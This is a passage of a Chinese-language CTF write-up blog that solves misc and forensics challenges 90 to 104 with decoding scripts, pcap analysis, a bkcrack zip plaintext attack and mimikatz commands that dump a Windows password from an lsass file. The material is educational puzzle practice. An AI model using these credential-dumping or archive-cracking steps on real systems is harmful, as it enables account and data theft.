class="code"><pre><span class="line">84  104  97  116  32  119  97  115  32  102  97  115  116  33  32  84  104  101  32  102  108  97  103  32  105  115  58  32  68  68  67  84  70  123  57  50  50  97  98  57  57  55  52  97  52  55  99  100  51  50  50  99  102  52  51  98  53  48  54  49  48  102  97  101  97  53  125</span><br></pre></td></tr></table></figure><p>然后转化ascii就能得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">That was fast! The flag is: DDCTF&#123;922ab9974a47cd322cf43b50610faea5&#125;</span><br></pre></td></tr></table></figure><p>flag：flag{922ab9974a47cd322cf43b50610faea5}</p><h3 id="90-MRCTF2020-千层套路"><a href="#90-MRCTF2020-千层套路" class="headerlink" title="90.[MRCTF2020]千层套路"></a>90.[MRCTF2020]千层套路</h3><p>得到一个压缩包，解压一下发现有个0573.zip，解压密码刚好是0573</p><p>得到一个0114.zip，猜测有多个类似的压缩包</p><p>网上找了个脚本，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_and_store_final_file</span>(<span class="params">initial_zip_path, target_dir</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target_dir):</span><br><span class="line">        os.makedirs(target_dir)</span><br><span class="line"> </span><br><span class="line">    current_zip_path = initial_zip_path</span><br><span class="line"> </span><br><span class="line">    password = os.path.basename(initial_zip_path)[:<span class="number">4</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(current_zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">            files = zip_ref.namelist()</span><br><span class="line">            file_name = files[<span class="number">0</span>]</span><br><span class="line">            next_zip_name = os.path.join(target_dir, file_name)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                zip_ref.extractall(target_dir, pwd=<span class="built_in">bytes</span>(password, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Extracted <span class="subst">&#123;file_name&#125;</span> to <span class="subst">&#123;target_dir&#125;</span> using password <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Error extracting <span class="subst">&#123;file_name&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> file_name.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">                current_zip_path = next_zip_name</span><br><span class="line">                password = file_name[:<span class="number">4</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line"> </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;The final file is <span class="subst">&#123;file_name&#125;</span>, stored in <span class="subst">&#123;target_dir&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">initial_zip_path = <span class="string">&#x27;0573.zip&#x27;</span> <span class="comment">#第一个解密的压缩包名称</span></span><br><span class="line">target_dir = <span class="string">&#x27;flag&#x27;</span> <span class="comment">#放进的文件夹</span></span><br><span class="line">extract_and_store_final_file(initial_zip_path, target_dir)</span><br></pre></td></tr></table></figure><p>千层套路还真是有一千个压缩包。。</p><p>最后得到一个qr.txt，看了一眼发现是</p><img src="2025-01-15 203220.png" alt="2025-01-15 203220" style="zoom:80%;"><p>感觉是二维码之类的，要RGB数据串转图片一下</p><p>随波逐流一下，得到一个二维码</p><img src="2025-01-15 204923.png" alt="2025-01-15 204923" style="zoom:50%;"><p>扫一下得到flag：flag{ta01uyout1nreet1n0usandtimes}</p><h3 id="91-百里挑一"><a href="#91-百里挑一" class="headerlink" title="91.百里挑一"></a>91.百里挑一</h3><p>pcap里面有一堆jpg，然而似乎并没什么卵用</p><p>直接分组字节流，搜索flag就能发现前半段flag</p><img src="屏幕截图 2025-02-02 170001.png" alt="屏幕截图 2025-02-02 170001" style="zoom:80%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ae58d0408e26e8f</span><br></pre></td></tr></table></figure><p>然后在flag旁边发现<code>http://ns.adobe.com/xap</code>，疑似关键词</p><p>搜索adobe，发现后半段flag</p><img src="屏幕截图 2025-02-02 170501.png" alt="屏幕截图 2025-02-02 170501" style="zoom:80%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">26a3c0589d23edeec&#125;</span><br></pre></td></tr></table></figure><p>连起来得到flag：flag{ae58d0408e26e8f26a3c0589d23edeec}</p><h3 id="92-SUCTF2018-followme"><a href="#92-SUCTF2018-followme" class="headerlink" title="92.[SUCTF2018]followme"></a>92.[SUCTF2018]followme</h3><p>拿到pcapng，随波逐流一把梭</p><img src="屏幕截图 2025-02-02 171135.png" alt="屏幕截图 2025-02-02 171135" style="zoom: 33%;"><p>看到CTF{password_is_not_weak}</p><p>flag：flag{password_is_not_weak}</p><h3 id="93-MRCTF2020-CyberPunk"><a href="#93-MRCTF2020-CyberPunk" class="headerlink" title="93.[MRCTF2020]CyberPunk"></a>93.[MRCTF2020]CyberPunk</h3><p>拿到cyberpunk! .exe，直接运行程序看到</p><img src="屏幕截图 2025-02-02 171541.png" alt="屏幕截图 2025-02-02 171541" style="zoom:80%;"><p>提示我们时间2020.9.17，我们修改电脑时间为2020.9.17</p><p>修改完成后重新启动程序就能看到flag了</p><img src="屏幕截图 2020-09-17 171943.png" alt="屏幕截图 2020-09-17 171943" style="zoom:80%;"><p>flag：flag{We1cOm3_70_cyber_security}</p><h3 id="94-BSidesSF2019-zippy"><a href="#94-BSidesSF2019-zippy" class="headerlink" title="94.[BSidesSF2019]zippy"></a>94.[BSidesSF2019]zippy</h3><p>拿到pcapng直接foremost一下，得到一个zip，爆破一下发现爆不出来</p><p>搜索一下password，发现</p><img src="屏幕截图 2025-02-02 174417.png" alt="屏幕截图 2025-02-02 174417" style="zoom:80%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -P supercomplexpassword flag.zip</span><br></pre></td></tr></table></figure><p>所以supercomplexpassword就是解压密码</p><p>得到flag：flag{this_flag_is_your_flag}</p><h3 id="95-安洵杯-2019-Attack"><a href="#95-安洵杯-2019-Attack" class="headerlink" title="95.[安洵杯 2019]Attack"></a>95.[安洵杯 2019]Attack</h3><p>拿到的pcap直接foremost，得到一个zip</p><p>zip里有一个注释<code>这可是administrator的秘密，怎么能随便给人看呢？</code></p><p>感觉是电脑密码有关的，看到流量包里面有一个<code>lsass.dmp</code></p><blockquote><p>dmp文件是windows系统中的错误转储文件，当Windows发生错误蓝屏的时候，系统将当前内存【含虚拟内存】中的数据直接写到文件中去，方便定位故障原因。</p><p>里面包含主机用户密码信息</p></blockquote><p>.dmp文件binwalk和foremost提不出来，需要我们手动提一下</p><p>提出来之后用<code>mimikatz</code>分析文件，下载地址 <a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919">发行版 2.2.0 20220919 Djoin parser &amp; Citrix SSO Extractor · gentilkiwi&#x2F;mimikatz · GitHub</a></p><p>这个是已经打包好的exe，直接运行就行</p><p>相关命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//提升权限</span><br><span class="line">privilege::debug</span><br><span class="line">//载入dmp文件</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">//读取登陆密码</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure><img src="屏幕截图 2025-02-02 181953.png" alt="屏幕截图 2025-02-02 181953" style="zoom:80%;"><p>发现密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">W3lc0meToD0g3</span><br></pre></td></tr></table></figure><p>解压得到D0g3{3466b11de8894198af3636c5bd1efce2} （这个在txt最后一行）</p><p>flag：flag{3466b11de8894198af3636c5bd1efce2} </p><h3 id="96-UTCTF2020-basic-forensics"><a href="#96-UTCTF2020-basic-forensics" class="headerlink" title="96.[UTCTF2020]basic-forensics"></a>96.[UTCTF2020]basic-forensics</h3><p>得到一个jpeg，实则不然，010打开发现只有文字。</p><p>直接txt打开，搜索flag发现utflag{fil3_ext3nsi0ns_4r3nt_r34l}</p><p>flag：flag{fil3_ext3nsi0ns_4r3nt_r34l}</p><h3 id="97-SUCTF-2019-Game"><a href="#97-SUCTF-2019-Game" class="headerlink" title="97.[SUCTF 2019]Game"></a>97.[SUCTF 2019]Game</h3><p>一个zip和一张图片，zip里html打开发现</p><img src="屏幕截图 2025-02-02 183312.png" alt="屏幕截图 2025-02-02 183312" style="zoom:80%;"><p>得到suctf{hAHaha_Fak3_F1ag}，好吧是假的</p><p>图片在lsb里发现</p><img src="屏幕截图 2025-02-02 183722.png" alt="屏幕截图 2025-02-02 183722" style="zoom:50%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==</span><br></pre></td></tr></table></figure><p>base64显示<code>Salted__</code>，是加了盐的</p><p>使用网站进行解密 <a href="https://www.sojson.com/encrypt_triple_des.html">在线Triple DES加密 | Triple DES解密- 在线工具</a>，密钥就是之前的假密码</p><img src="屏幕截图 2025-02-02 184632.png" alt="屏幕截图 2025-02-02 184632" style="zoom:80%;"><p>得到suctf{U_F0und_1t}</p><p>flag：flag{U_F0und_1t}</p><h3 id="98-USB"><a href="#98-USB" class="headerlink" title="98.USB"></a>98.USB</h3><p>得到一个233.rar和一个key.ftm</p><p>key.ftm用foremost分离出两个zip，解压出来是一个key.pcap</p><p>打开发现是usb流量，使用<code>UsbKeyboardDataHacker</code></p><p>地址这里  <a href="https://github.com/WangYihang/UsbKeyboardDataHacker">GitHub - WangYihang&#x2F;UsbKeyboardDataHacker: USB键盘流量包取证工具 , 用于恢复用户的击键信息</a></p><p>使用它，发现</p><img src="屏幕截图 2025-02-02 221515.png" alt="屏幕截图 2025-02-02 221515" style="zoom:80%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key&#123;xinan&#125;</span><br></pre></td></tr></table></figure><p>然后我们回过头来看压缩包，压缩包拖进010发现报错了</p><p>修改文件头把<code>7A</code>改成<code>74</code></p><p>然后就能发现压缩包凭空多出来一张png</p><p>lsb一下发现一个二维码</p><img src="屏幕截图 2025-02-02 223353.png" alt="屏幕截图 2025-02-02 223353" style="zoom:33%;"><p>扫一下得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ci&#123;v3erf_0tygidv2_fc0&#125;</span><br></pre></td></tr></table></figure><p>结合之前得到的key维吉尼亚解密一下得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fa&#123;i3eei_0llgvgn2_sc0&#125;</span><br></pre></td></tr></table></figure><p>隐约见到flag字符，栅栏解密得到flag：flag{vig3ne2e_is_c00l}</p><h3 id="99-DDCTF2018-流量分析"><a href="#99-DDCTF2018-流量分析" class="headerlink" title="99.[DDCTF2018]流量分析"></a>99.[DDCTF2018]流量分析</h3><p>提示我们补齐私钥格式，而打开发现没有http流，猜测为http被加密了</p><p>我们接着寻找tcp及其中的私钥</p><p>搜索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp contains&quot;KEY&quot;</span><br></pre></td></tr></table></figure><p>发现了三个流，依次追踪tcp流</p><img src="屏幕截图 2025-02-02 225518.png" alt="屏幕截图 2025-02-02 225518" style="zoom:80%;"><p>在第二个tcp流中发现了一个被base64加密的图片</p><img src="屏幕截图 2025-02-02 225708.png" alt="屏幕截图 2025-02-02 225708" style="zoom: 33%;"><p>使用随波逐流的<code>base64转图片</code>得到</p><img src="屏幕截图 2025-02-02 225931.png" alt="屏幕截图 2025-02-02 225931" style="zoom:80%;"><p>提取其中文字，并保存在新建的文本中（不放心的话可以在这里转换一下md5和提示里的相比较）</p><p>接下来就是<strong>添加解密私钥，查看http明文</strong>了</p><p><strong>编辑-首选项-Protocols-TLS-Edit-+-Key File-Browse</strong></p><p>查看http，发现就两个流</p><p>在第二个流里发现DDCTF{0ca2d8642f90e10efd9092cd6a2831c0}</p><p>flag：flag{0ca2d8642f90e10efd9092cd6a2831c0}</p><h3 id="100-GUET-CTF2019-虚假的压缩包"><a href="#100-GUET-CTF2019-虚假的压缩包" class="headerlink" title="100.[GUET-CTF2019]虚假的压缩包"></a>100.[GUET-CTF2019]虚假的压缩包</h3><p>解压压缩包发现<code>一个虚假的压缩包</code>和<code>一个真实的压缩包</code></p><p>虚假的压缩包可以用7z解压出来，看到一个key.txt，内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">数学题</span><br><span class="line">n = 33</span><br><span class="line">e = 3</span><br><span class="line">解26</span><br><span class="line"></span><br><span class="line">-------------------------</span><br><span class="line">答案是</span><br></pre></td></tr></table></figure><p>这里应该就是考我们rsa加密了</p><p>脚本（网上找的，当然不用脚本也可以用ai直接算出答案）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">import</span> gmpy2</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_pq</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(n**<span class="number">0.5</span>) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">            q = n // p</span><br><span class="line">            <span class="keyword">return</span> p, q</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_decrypt</span>(<span class="params">n, e, c</span>):</span><br><span class="line">    p, q = find_pq(n)</span><br><span class="line">    phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = gmpy2.invert(e, phi_n)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"> </span><br><span class="line">n = <span class="number">33</span>  <span class="comment"># 替换为实际的n值</span></span><br><span class="line">e = <span class="number">3</span> <span class="comment"># 替换为实际的e值</span></span><br><span class="line">c = <span class="number">26</span>  <span class="comment"># 替换为实际的密文c值</span></span><br><span class="line"> </span><br><span class="line">plaintext = rsa_decrypt(n, e, c)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;明文m为:&quot;</span>, plaintext)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#请注意，上述代码中的 n、e、c 需要根据实际情况进行替换。</span></span><br></pre></td></tr></table></figure><p>最后得出答案是5</p><p>用<code>答案是5</code>解压<code>一个真实的压缩包</code></p><p>得到 一张没卵用且会浪费你时间的图片.jpg 和 亦真亦假</p><p>把一张没卵用且会浪费你时间的图片.jpg直接拖进随波逐流发现压缩了宽高，下方是：</p><img src="屏幕截图 2025-02-03 001535.png" alt="屏幕截图 2025-02-03 001535" style="zoom: 50%;"><p>我们对另一个文件进行异或5</p><p>使用随波逐流，选择<code>进制转换/16进制字符串异或</code>（不用随波逐流的话也可以网上找脚本）</p><img src="屏幕截图 2025-02-03 003043.png" alt="屏幕截图 2025-02-03 003043" style="zoom:33%;"><p>保存的hex.txt使用010另存为文件</p><p>看到504B0304的文件头本来以为是zip，结果一打开才发现是docx</p><p>打开之后全标红发现：</p><img src="屏幕截图 2025-02-03 003317.png" alt="屏幕截图 2025-02-03 003317" style="zoom:33%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;_th2_7ru8_2iP_&#125;</span><br></pre></td></tr></table></figure><h3 id="101-RCTF2019-draw"><a href="#101-RCTF2019-draw" class="headerlink" title="101.[RCTF2019]draw"></a>101.[RCTF2019]draw</h3><p>全文：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cs pu lt 90 fd 500 rt 90 pd fd 100 rt 90 repeat 18[fd 5 rt 10] lt 135 fd 50 lt 135 pu bk 100 pd setcolor pick [ red orange yellow green blue violet ] repeat 18[fd 5 rt 10] rt 90 fd 60 rt 90 bk 30 rt 90 fd 60 pu lt 90 fd 100 pd rt 90 fd 50 bk 50 setcolor pick [ red orange yellow green blue violet ] lt 90 fd 50 rt 90 fd 50 pu fd 50 pd fd 25 bk 50 fd 25 rt 90 fd 50 pu setcolor pick [ red orange yellow green blue violet ] fd 100 rt 90 fd 30 rt 45 pd fd 50 bk 50 rt 90 fd 50 bk 100 fd 50 rt 45 pu fd 50 lt 90 pd fd 50 bk 50 rt 90 setcolor pick [ red orange yellow green blue violet ] fd 50 pu lt 90 fd 100 pd fd 50 rt 90 fd 25 bk 25 lt 90 bk 25 rt 90 fd 25 setcolor pick [ red orange yellow green blue violet ] pu fd 25 lt 90 bk 30 pd rt 90 fd 25 pu fd 25 lt 90 pd fd 50 bk 25 rt 90 fd 25 lt 90 fd 25 bk 50 pu bk 100 lt 90 setcolor pick [ red orange yellow green blue violet ] fd 100 pd rt 90 arc 360 20 pu rt 90 fd 50 pd arc 360 15 pu fd 15 setcolor pick [ red orange yellow green blue violet ] lt 90 pd bk 50 lt 90 fd 25 pu home bk 100 lt 90 fd 100 pd arc 360 20 pu home</span><br></pre></td></tr></table></figure><p>题目名字加文本感觉就是画图没跑了</p><p>直接在线网站： <a href="https://www.calormen.com/jslogo/">Logo解释器</a></p><img src="屏幕截图 2025-02-13 170929.png" alt="屏幕截图 2025-02-13 170929" style="zoom:80%;"><p>flag：flag{RCTF_HeyLogo}</p><h3 id="102-ACTF新生赛2020-明文攻击"><a href="#102-ACTF新生赛2020-明文攻击" class="headerlink" title="102.[ACTF新生赛2020]明文攻击"></a>102.[ACTF新生赛2020]明文攻击</h3><p>哇，盐都不盐了，直接说明文攻击了。</p><p>解压后得到一张woo.jpg和res.zip</p><p>感觉思路就是图片隐写+明文攻击了</p><p>这题纯分离是分不出来的，需要我们010看这张图片</p><img src="屏幕截图 2025-02-13 172843.png" alt="屏幕截图 2025-02-13 172843" style="zoom:80%;"><p>看到一个PK文件头里面有flag.txt，但是解压不出来。</p><p>再往前看发现有一个0304，但是缺少504B，感觉就是因为这个所以才解压不出来，补上文件头，再另存一下</p><img src="屏幕截图 2025-02-13 173238.png" alt="屏幕截图 2025-02-13 173238" style="zoom:80%;"><p>解压出来看到flag.txt里面的内容是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this is the flag.</span><br></pre></td></tr></table></figure><p>对比一下CRC32，发现跟res.zip里面那个是一样的，所以就靠这个来明文攻击了</p><p>命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C res.zip -c flag.txt -P 1.zip -p flag.txt</span><br></pre></td></tr></table></figure><p>然后就能爆出来了</p><img src="屏幕截图 2025-02-13 174004.png" alt="屏幕截图 2025-02-13 174004" style="zoom:80%;"><p>密钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">251dfe00 ec858db2 6e8a0dff</span><br></pre></td></tr></table></figure><p>另存：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C res.zip -k 251dfe00 ec858db2 6e8a0dff -U out.zip 1234</span><br></pre></td></tr></table></figure><p>就能看到ACTF{3te9_nbb_ahh8}</p><p>flag：flag{3te9_nbb_ahh8}</p><h3 id="103-SWPU2019-Network"><a href="#103-SWPU2019-Network" class="headerlink" title="103.[SWPU2019]Network"></a>103.[SWPU2019]Network</h3><p>下载之后看到诸如：</p><img src="屏幕截图 2025-02-14 181234.png" alt="屏幕截图 2025-02-14 181234" style="zoom:80%;"><p>这种。</p><p>实际上这是TTL加密</p><blockquote><p>[!NOTE]</p><p>TTL加密：<br>简单来说就是，图中63，127，191，255转化为二进制的值分别为 00111111，01111111，10111111，11111111。</p><p>发现只有前两位不同，TTL加密就是利用前两位进行加密，将每个前两位重新进行合并，8位为一组。</p><p>所以TTL加密的解密方法：</p><p>1，将所有前两位合并为8位，并且每八位一组。</p><p>2，将上面的每组转化为十六进制的字符</p></blockquote><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"> </span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">Binary = <span class="string">&#x27;&#x27;</span></span><br><span class="line">number = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    num = f.readline()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> num:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> num.rstrip() == <span class="string">&#x27;63&#x27;</span>:  <span class="comment"># 去掉每行后面的空格</span></span><br><span class="line">        Binary = <span class="string">&#x27;00&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> num.rstrip() == <span class="string">&#x27;127&#x27;</span>:</span><br><span class="line">        Binary = <span class="string">&#x27;01&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> num.rstrip() == <span class="string">&#x27;191&#x27;</span>:</span><br><span class="line">        Binary = <span class="string">&#x27;10&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> num.rstrip() == <span class="string">&#x27;255&#x27;</span>:</span><br><span class="line">        Binary = <span class="string">&#x27;11&#x27;</span></span><br><span class="line">    <span class="built_in">str</span> += Binary</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(<span class="built_in">str</span>), <span class="number">8</span>):</span><br><span class="line">    number += <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">data = binascii.unhexlify(number)</span><br><span class="line"> </span><br><span class="line">f2=<span class="built_in">open</span>(<span class="string">&#x27;111.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f2.write(data)</span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure><p>这个脚本要跑好一会。</p><p>然后我们把111.txt拖到010，发现是一个zip文件，还是加密的zip</p><p>是伪加密，直接随波逐流修复后打开flag.txt发现</p><img src="屏幕截图 2025-02-14 184915.png" alt="屏幕截图 2025-02-14 184915" style="zoom:80%;"><p>一眼是base64，而且是多次base64解密，建议脚本，其他都不好用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>).read()</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = base64.b32decode(f)</span><br><span class="line">        <span class="built_in">print</span>(f.decode()[:<span class="number">100</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = base64.b64decode(f)</span><br><span class="line">            <span class="built_in">print</span>(f.decode()[:<span class="number">100</span>])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(f[:<span class="number">100</span>])</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>解密得到flag</p><p>flag：flag{189ff9e5b743ae95f940a6ccc6dbd9ab}</p><h3 id="104-GKCTF-2021-签到"><a href="#104-GKCTF-2021-签到" class="headerlink" title="104.[GKCTF 2021]签到"></a>104.[GKCTF 2021]签到</h3><p>打开发现一堆http流量，点进一个看一下</p><img src="屏幕截图 2025-02-20 172541.png" alt="屏幕截图 2025-02-20 172541" style="zoom:80%;"><p>解码之后发现是php.llehspmt</p><p>是倒序的，正序一下就是tmpshell.php</p><p>继续看下一个流量，然后在一个比较大的文件解密之后看到</p><img src="屏幕截图 2025-02-20 174044.png" alt="屏幕截图 2025-02-20 174044" style="zoom:80%;"><p>即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wIDIgACIgACIgAyIK0wIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMiCNoQD</span><br><span class="line">jMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjoQDjACIgACIgACIggDM6EDM6AjMgAzMtMDMtEjM</span><br><span class="line">t0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0iCNMyIjMyIjMyIjMyI</span><br><span class="line">6AjMgAzMtMDMtEjMwIjO0eZ62ep5K0wKrQWYwVGdv5EItAiM1Aydl5mK6M6jlfpqnrQDt0SLt0SL</span><br><span class="line">t0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLK0AIdZavo75mlvlCNMTM6EDM</span><br><span class="line">z0yMw0SMyAjM6Q7lpb7lmrQDrsCZhBXZ09mTg0CIyUDI3VmbqozoPW+lqeuCN0SLt0SLt0SLt0SL</span><br><span class="line">sxWZld1V913e7d2ZhFGbsZmZg0lp9iunbW+Wg0lp9iunbW+Wg0lp9iunbW+WK0wMxoTMwoDMyACM</span><br><span class="line">DN0QDN0QDlWazNXMx0Wbf9lRGRDNDN0ard0Rf9VZl1WbwADIdRampDKilvFIdRampDKilvVKpM2Y</span><br><span 